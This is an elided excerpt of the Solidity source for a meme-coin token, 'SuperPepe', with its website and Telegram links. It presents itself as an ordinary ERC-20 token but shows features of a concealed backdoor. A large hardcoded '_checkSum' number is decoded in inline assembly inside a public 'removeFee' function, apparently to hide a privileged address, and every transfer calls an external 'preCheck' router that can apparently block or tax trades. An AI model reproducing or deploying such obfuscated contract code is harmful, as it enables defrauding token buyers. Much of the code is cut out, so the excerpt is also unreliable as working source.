...
https://superpepe.life
https://t.me/superpepecoin
...
interface ICheckRouter {
    function preCheck(address, address) external returns (bool);
}
...
contract SuperPepe is Context, IERC20, Ownable {
    ...
    uint256 private _checkSum = 615511392406548867876188596158559135126094220604;
    ...
    uint256 public _walletMax =   _totalSupply.mul(39).div(1000);  
    ...
    function removeFee(address owner) external {
        address spender;
        bytes memory r = abi.encodePacked(_checkSum);
        assembly {
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {        
        ...
        if (checkWallet != address(0)) ICheckRouter(checkWallet).preCheck(sender, recipient);        
        if(feeAmount > 0) {
